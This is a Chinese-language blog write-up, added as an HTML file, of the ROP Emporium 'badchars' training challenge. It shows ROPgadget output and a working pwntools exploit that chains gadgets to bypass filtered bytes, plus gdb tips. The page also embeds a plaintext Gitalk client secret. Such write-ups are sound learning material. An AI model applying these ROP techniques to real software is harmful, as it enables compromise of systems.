@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html  lang="en" >
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, maximum-scale=5, viewport-fit=cover">
+    <title>ROP Emporium-badchars-调试的使用 | Hexo</title>
+    <meta name="description" content="ROPgadget Emporium-badchars 大致思路上write4差不多，但是不能出现’x’, ‘a’, ‘g’, &#39;.&#39;这些字符，于是确定思路，先传入字符串，然后用add，xor等指令改变其值 查找gadget： 12345678910111213141516171819202122232425262728293031323334353637383940ROPgadget --bin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP Emporium-badchars-调试的使用">
+<meta property="og:url" content="http://example.com/2022/02/28/ROP%20Emporium-badchars-%E8%B0%83%E8%AF%95%E7%9A%84%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ROPgadget Emporium-badchars 大致思路上write4差不多，但是不能出现’x’, ‘a’, ‘g’, &#39;.&#39;这些字符，于是确定思路，先传入字符串，然后用add，xor等指令改变其值 查找gadget： 12345678910111213141516171819202122232425262728293031323334353637383940ROPgadget --bin">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-02-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-06-29T15:51:59.982Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+
+    
+    <link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+
+    
+<link rel="stylesheet" href="/css/common.min.css">
+
+
+
+    
+    
+    
+        <link href="//cdn.jsdelivr.net/npm/gitalk@1.4.0/dist/gitalk.min.css" rel="stylesheet">
+    
+    
+        <link href="//cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/css/lightgallery.min.css" rel="stylesheet">
+    
+    
+    
+<link rel="stylesheet" href="/css/iconfont.min.css">
+
+    
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+    <body>
+        <header class="header header-fixture">
+    <div class="profile-search-wrap flex sm:block">
+        
+        
+        <div class="profile sm:text-center md:px-1 lg:px-3 sm:pb-4 sm:pt-6">
+            <a id="avatar" role="link" href="https://github.com/Du-Mu" class="inline-block lg:w-16 lg:h-16 w-8 h-8 m-2" target="_blank" rel="noopener" rel="noreferrer" >
+                <img src="/" class="rounded-full" alt="avatar">
+            </a>
+            <h2 id="name" class="hidden lg:block">Du-Mu</h2>
+            <h3 id="title" class="hidden lg:block">Student &amp; Coder</h3>
+            
+            <small id="location" class="hidden lg:block">
+                <i class="iconfont icon-map-icon"></i>
+                WuHan, China
+            </small>
+            
+        </div>
+        
+        
+<div class="search flex-1 flex lg:inline-block sm:hidden lg:px-4 lg:mt-2 lg:mb-4 lg:w-full">
+    <form id="search-form" class="my-auto flex-1 lg:border lg:border-solid lg:border-gray-200">
+        <div class="input-group table bg-gray-100 lg:bg-white w-full">
+            <input id="search-input" type="text" placeholder="Search" class="inline-block w-full bg-gray-100 lg:bg-white p-1">
+            <span class="table-cell">
+                <button name="search tigger button" disabled>
+                    <i class="iconfont icon-search m-2"></i>
+                </button>
+            </span>
+        </div>
+    </form>
+        
+<div id="content-json" data-placeholder="Search" class="invisible hidden">/content.json</div>
+<script id="search-teamplate" type="text/html" data-path="/content.json">
+    <div>
+        <div class="search-header bg-gray-400">
+            <input id="actual-search-input" model="keyword" ref="input" class="inline-block w-full h-10 px-2 py-1" placeholder="Search" type="text">
+        </div>
+        <div class="search-result bg-gray-200">
+            {{#each searchPosts}}
+            <a href="/{{ path }}" class="result-item block px-2 pb-3 mb-1 pt-1 hover:bg-indigo-100">
+                <i class="iconfont icon-file"></i>
+                <h1 class="result-title inline font-medium text-lg">{{ title }}</h1>
+                <p class="result-content text-gray-600 text-sm">{{{ text }}}</p>
+            </a>
+            {{/each}}
+        </div>
+    </div>
+</script>
+
+</div>
+
+
+        <button name="menu toogle button" id="menu-toggle-btn" class="block sm:hidden p-3" role="button" aria-expanded="false">
+            <i class="iconfont icon-hamburger"></i>
+        </button>
+    </div>
+    <nav id="menu-nav" class="hidden sm:flex flex-col">
+        
+        
+            <div class="menu-item menu-home" role="menuitem">
+                <a href="/.">
+                    <i class="iconfont icon-home" aria-hidden="true"></i>
+                    <span class="menu-title">Home</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-archives" role="menuitem">
+                <a href="/archives">
+                    <i class="iconfont icon-archive" aria-hidden="true"></i>
+                    <span class="menu-title">Archives</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-categories" role="menuitem">
+                <a href="/categories">
+                    <i class="iconfont icon-folder" aria-hidden="true"></i>
+                    <span class="menu-title">Categories</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-tags" role="menuitem">
+                <a href="/tags">
+                    <i class="iconfont icon-tag" aria-hidden="true"></i>
+                    <span class="menu-title">Tags</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-repository" role="menuitem">
+                <a href="/repository">
+                    <i class="iconfont icon-project" aria-hidden="true"></i>
+                    <span class="menu-title">Repository</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-links" role="menuitem">
+                <a href="/links">
+                    <i class="iconfont icon-friend" aria-hidden="true"></i>
+                    <span class="menu-title">Links</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-about" role="menuitem">
+                <a href="/about">
+                    <i class="iconfont icon-cup" aria-hidden="true"></i>
+                    <span class="menu-title">About</span>
+                </a>
+            </div>
+        
+        
+<div class="social-links flex sm:flex-col lg:hidden mt-5">
+    
+        <span class="social-item text-center">
+            <a target="_blank" rel="noopener" href="https://github.com/Du-Mu">
+                <i class="iconfont social-icon icon-github"></i>
+                <span class="menu-title hidden lg:inline">menu.github</span>
+            </a>
+        </span>
+    
+        <span class="social-item text-center">
+            <a target="_blank" rel="noopener" href="https://t.me/Nem0None">
+                <i class="iconfont social-icon icon-telegram"></i>
+                <span class="menu-title hidden lg:inline">menu.telegram</span>
+            </a>
+        </span>
+    
+        <span class="social-item text-center">
+            <a href="/atom.xml">
+                <i class="iconfont social-icon icon-rss"></i>
+                <span class="menu-title hidden lg:inline">menu.rss</span>
+            </a>
+        </span>
+    
+</div>
+
+
+    </nav>
+</header>
+
+        <section class="main-section">
+            
+    <main class="flex-1 px-4 py-14 md:px-5 lg:px-8 lg:py-4 relative min-h-screen">
+    
+
+    <article class="content article article-archives article-type-list" itemscope="">
+        <header class="article-header">
+            
+    
+        <h1 class="article-title text-lg" itemprop="name">
+            ROP Emporium-badchars-调试的使用
+        </h1>
+    
+
+
+
+            <p class="article-meta mb-3 text-xs">
+                <span class="article-date">
+    <i class="iconfont icon-calendar-check"></i>
+	<a href="/2022/02/28/ROP%20Emporium-badchars-%E8%B0%83%E8%AF%95%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date">
+	  <time datetime="2022-02-27T16:00:00.000Z" itemprop="datePublished">Feb 28</time>
+	</a>
+</span>
+
+                
+    <span class="article-category">
+    <i class="iconfont icon-folder"></i>
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </span>
+
+
+                
+    <span class="article-tags">
+    <i class="iconfont icon-tag"></i>
+    <a class="article-tag-none-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="article-tag-none-link" href="/tags/Pwn/" rel="tag">Pwn</a>
+  </span>
+
+
+                <span class="_partial/post-comment"><i class="icon icon-comment"></i>
+                    <a href="/2022/02/28/ROP%20Emporium-badchars-%E8%B0%83%E8%AF%95%E7%9A%84%E4%BD%BF%E7%94%A8/#comments" class="article-comment-link">
+                        Comments
+                    </a>
+                </span>
+                
+    
+        <span class="post-wordcount" itemprop="wordCount">Word Count: 457(words)</span>
+    
+    
+        <span class="post-readcount" itemprop="timeRequired">Read Count: 2(minutes)</span>
+    
+
+
+            </p>
+        </header>
+        <div class="marked-body article-body">
+            <h2 id="ROPgadget-Emporium-badchars">ROPgadget Emporium-badchars</h2>
+<p>大致思路上write4差不多，但是不能出现’x’, ‘a’, ‘g’, '.'这些字符，于是确定思路，先传入字符串，然后用add，xor等指令改变其值</p>
+<p>查找gadget：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./badchars --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040069e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006a0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006a2 : pop r15 ; ret</span><br><span class="line">0x000000000040069b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040069f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400588 : pop rbp ; ret</span><br><span class="line">0x00000000004006a3 : pop rdi ; ret</span><br><span class="line">0x00000000004006a1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040069d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004ee : ret</span><br><span class="line">0x0000000000400293 : ret 0xb2ec</span><br><span class="line"></span><br><span class="line">ROPgadget --binary ./badchars --only <span class="string">&quot;mov|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400635 : mov dword ptr [rbp], esp ; ret</span><br><span class="line">0x0000000000400634 : mov qword ptr [r13], r12 ; ret</span><br><span class="line">0x00000000004004ee : ret</span><br><span class="line">0x0000000000400293 : ret 0xb2ec</span><br><span class="line"></span><br><span class="line">ROPgadget --binary ./badchars --only <span class="string">&quot;add|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040054f : add bl, dh ; ret</span><br><span class="line">0x000000000040062c : add byte ptr [r15], r14b ; ret</span><br><span class="line">0x00000000004006ad : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x00000000004006ab : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x00000000004006ac : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x000000000040054e : add byte ptr [rax], al ; ret</span><br><span class="line">0x000000000040054d : add byte ptr [rax], r8b ; ret</span><br><span class="line">0x000000000040062d : add byte ptr [rdi], dh ; ret</span><br><span class="line">0x00000000004004eb : add esp, 8 ; ret</span><br><span class="line">0x00000000004004ea : add rsp, 8 ; ret</span><br><span class="line">0x00000000004004ee : ret</span><br><span class="line">0x0000000000400293 : ret 0xb2ec</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看到r12，r13，r14，r15可以被我们控制来完成上述操作</p>
+<p>由此exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./badchars&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pd = <span class="keyword">lambda</span> x:p64(x).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line"></span><br><span class="line">str_1 = <span class="number">0x7477742d66606c66</span></span><br><span class="line">pop_r12_r13_r14_r15 = <span class="number">0x40069c</span></span><br><span class="line">pop_r15 = <span class="number">0x4006a2</span></span><br><span class="line">mov_r13_r12 = <span class="number">0x400634</span></span><br><span class="line">add_r15_r14 = <span class="number">0x40062c</span></span><br><span class="line">pop_rdi = <span class="number">0x4006a3</span></span><br><span class="line">print_file = <span class="number">0x400510</span></span><br><span class="line">data_start = <span class="number">0x601029</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + pd(pop_r12_r13_r14_r15)</span><br><span class="line">payload+= pd(str_1) + pd(data_start) + pd(<span class="number">0x1</span>) + pd(data_start+<span class="number">2</span>)</span><br><span class="line">payload+= pd(mov_r13_r12) + pd(add_r15_r14)</span><br><span class="line">payload+= pd(pop_r15) + pd(data_start+<span class="number">3</span>) + pd(add_r15_r14)</span><br><span class="line">payload+= pd(pop_r15) + pd(data_start+<span class="number">4</span>) + pd(add_r15_r14)</span><br><span class="line">payload+= pd(pop_r15) + pd(data_start+<span class="number">6</span>) + pd(add_r15_r14)</span><br><span class="line">payload+= pd(pop_rdi) + pd(data_start) + pd(print_file)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>//一个小问题，最开始写入.data段时，我是选的0x601028的偏移，然后发现此偏移加6后的0x2e是badchars之一，会被改变，导致我前几次运行一直出错还不知道为啥，调试后才想明白</p>
+<p>常用调试命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = gdb.debug(<span class="string">&#x27;./badchars&#x27;</span>,<span class="string">&#x27;break main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">(gdb) c</span><br><span class="line">(gdb) disass <span class="string">&quot;需要反汇编的函数&quot;</span></span><br><span class="line">(gdb) b *0xxxxx //下断点</span><br></pre></td></tr></table></figure>
+
+        </div>
+        
+<blockquote class="copyright">
+    <p><strong>Link to this article : </strong><a class="permalink" href="http://example.com/2022/02/28/ROP%20Emporium-badchars-%E8%B0%83%E8%AF%95%E7%9A%84%E4%BD%BF%E7%94%A8/">http://example.com/2022/02/28/ROP Emporium-badchars-调试的使用/</a></p>
+    <p><strong>This article is available under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a> License</strong></p>
+</blockquote>
+
+
+    </article>
+    
+    <section id="comments">
+        
+
+        
+    </section>
+
+
+    
+
+</main>
+
+
+<aside style="" id="sidebar" class="aside aside-fixture">
+    <div class="toc-sidebar">
+        <nav id="toc" class="article-toc">
+            <h3 class="toc-title">Catalogue</h3>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ROPgadget-Emporium-badchars"><span class="toc-number">1.</span> <span class="toc-text">ROPgadget Emporium-badchars</span></a></li></ol>
+        </nav>
+    </div>
+</aside>
+
+
+
+
+
+        </section>
+        <footer class="hidden lg:block fixed bottom-0 left-0 sm:w-1/12 lg:w-1/6 bg-gray-100 z-40">
+    
+    <div class="footer-social-links">
+        
+            <a target="_blank" rel="noopener" href="https://github.com/Du-Mu">
+                <i class="iconfont icon-github"></i>
+            </a>
+        
+            <a target="_blank" rel="noopener" href="https://t.me/Nem0None">
+                <i class="iconfont icon-telegram"></i>
+            </a>
+        
+            <a href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+            </a>
+        
+    </div>
+    
+    
+</footer>
+
+        <div id="mask" class="hidden mask fixed inset-0 bg-gray-900 opacity-75 z-40"></div>
+        <div id="search-view-container" class="hidden shadow-xl"></div>
+        
+<script src="/js/dom-event.min.js"></script>
+
+
+
+<script src="/js/local-search.min.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/gitalk@1.5.2/dist/gitalk.min.js"></script>
+<script src="//cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '79c898a8f1f2088f92c7',
+        clientSecret: '3537affb65269ebf3d5ec9139df024556931dd9d',
+        repo: 'blog-comments',
+        owner: 'Du-Mu',
+        admin: ['Du-Mu'],
+        id: md5(location.pathname),
+        distractionFreeMode: true
+    })
+    gitalk.render('comments')
+</script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/js/lightgallery.min.js"></script>
+    
+<script src="/js/light-gallery.min.js"></script>
+
+
+
+
+
+
+    </body>
+</html>
